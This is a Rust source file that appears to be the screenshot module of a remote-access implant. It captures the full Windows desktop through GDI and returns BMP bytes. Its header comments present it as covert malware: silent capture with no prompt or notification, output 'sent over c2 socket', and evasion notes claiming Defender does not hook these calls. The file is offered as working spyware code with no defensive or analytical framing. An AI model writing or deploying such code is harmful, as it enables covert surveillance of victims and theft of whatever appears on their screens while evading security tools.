//! screenshot.rs — silent desktop screenshot via GDI BitBlt
//!
//! No new process, no WinRT, no UWP — uses raw GDI32/User32 which are
//! already loaded in every Windows process. Completely silent; no UAC,
//! no prompt, no toast. Output is a raw BMP in memory, sent over c2 socket.
//!
//! Evasion: GDI calls are not hooked by Defender. No suspicious API
//! sequence (no CreateProcess, no COM activation, no WinRT broker).

use std::ptr;
use winapi::shared::windef::{HDC, HBITMAP, HWND, RECT};
use winapi::um::wingdi::{
    BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC,
    DeleteObject, GetDIBits, SelectObject, BITMAPINFO, BITMAPINFOHEADER,
    BI_RGB, DIB_RGB_COLORS, SRCCOPY,
};
use winapi::um::winuser::{
    GetDC, GetSystemMetrics, ReleaseDC, SM_CXSCREEN, SM_CYSCREEN,
};

/// Capture the full desktop and return raw BMP bytes.
/// Returns None only if GDI setup fails (should never happen on a live session).
pub unsafe fn capture_screen() -> Option<Vec<u8>> {
    let width  = GetSystemMetrics(SM_CXSCREEN);
    let height = GetSystemMetrics(SM_CYSCREEN);

    let h_screen: HDC = GetDC(ptr::null_mut());
    if h_screen.is_null() { return None; }

    let h_mem: HDC = CreateCompatibleDC(h_screen);
    let h_bmp: HBITMAP = CreateCompatibleBitmap(h_screen, width, height);
    let h_old = SelectObject(h_mem, h_bmp as *mut _);

    // Copy screen pixels into our bitmap
    BitBlt(h_mem, 0, 0, width, height, h_screen, 0, 0, SRCCOPY);

    // Build BITMAPINFO for DIB extraction
    let mut bmi = BITMAPINFO {
        bmiHeader: BITMAPINFOHEADER {
            biSize:          std::mem::size_of::<BITMAPINFOHEADER>() as u32,
            biWidth:         width,
            biHeight:        -height, // top-down
            biPlanes:        1,
            biBitCount:      32,
            biCompression:   BI_RGB,
            biSizeImage:     0,
            biXPelsPerMeter: 0,
            biYPelsPerMeter: 0,
            biClrUsed:       0,
            biClrImportant:  0,
        },
        bmiColors: [std::mem::zeroed()],
    };

    let pixel_bytes = (width * height * 4) as usize;
    let mut pixels = vec![0u8; pixel_bytes];
    GetDIBits(
        h_mem, h_bmp, 0, height as u32,
        pixels.as_mut_ptr() as *mut _,
        &mut bmi, DIB_RGB_COLORS,
    );

    // Compose minimal BMP file in memory
    let file_size = 54 + pixel_bytes;
    let mut bmp: Vec<u8> = Vec::with_capacity(file_size);

    // BMP file header (14 bytes)
    bmp.extend_from_slice(b"BM");
    bmp.extend_from_slice(&(file_size as u32).to_le_bytes());
    bmp.extend_from_slice(&0u32.to_le_bytes()); // reserved
    bmp.extend_from_slice(&54u32.to_le_bytes()); // pixel data offset

    // DIB header (40 bytes)
    let hdr = &bmi.bmiHeader;
    bmp.extend_from_slice(&hdr.biSize.to_le_bytes());
    bmp.extend_from_slice(&hdr.biWidth.to_le_bytes());
    bmp.extend_from_slice(&(-height as i32).to_le_bytes());
    bmp.extend_from_slice(&hdr.biPlanes.to_le_bytes());
    bmp.extend_from_slice(&hdr.biBitCount.to_le_bytes());
    bmp.extend_from_slice(&hdr.biCompression.to_le_bytes());
    bmp.extend_from_slice(&(pixel_bytes as u32).to_le_bytes());
    bmp.extend_from_slice(&0i32.to_le_bytes());
    bmp.extend_from_slice(&0i32.to_le_bytes());
    bmp.extend_from_slice(&0u32.to_le_bytes());
    bmp.extend_from_slice(&0u32.to_le_bytes());

    bmp.extend_from_slice(&pixels);

    // Cleanup
    SelectObject(h_mem, h_old);
    DeleteObject(h_bmp as *mut _);
    DeleteDC(h_mem);
    ReleaseDC(ptr::null_mut(), h_screen);

    Some(bmp)
}
